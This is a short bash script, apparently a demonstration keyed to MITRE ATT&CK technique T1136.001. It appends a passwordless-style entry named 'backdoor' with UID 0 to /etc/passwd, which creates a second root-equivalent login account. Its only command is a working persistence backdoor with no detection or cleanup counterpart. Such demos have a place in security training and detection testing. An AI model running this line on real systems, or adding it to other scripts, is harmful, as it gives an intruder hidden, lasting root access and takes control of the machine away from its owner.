#!/bin/bash
# DEMO 1: Add a backdoor account to /etc/passwd
# Requires: root
# Shows: T1136.001 - Create Local Account

# Add a demo account with UID 0
echo "backdoor:x:0:0::/home/backdoor:/bin/bash" >> /etc/passwd
